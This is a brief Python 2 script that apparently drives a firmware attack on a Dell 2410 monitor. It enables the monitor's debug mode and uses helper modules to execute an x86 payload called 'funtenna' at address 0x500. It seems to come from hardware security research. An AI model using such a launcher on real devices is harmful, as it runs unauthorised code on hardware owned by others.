#!/usr/bin/python2
import time
import protocol
import delltools
from payload import X86Payload

payload = X86Payload("funtenna")
dell = protocol.Dell2410()
dell.initialize()
dell.debug_on()
delltools.execute_payload(dell, payload, 0x500)
time.sleep(10)
dell.debug_off()
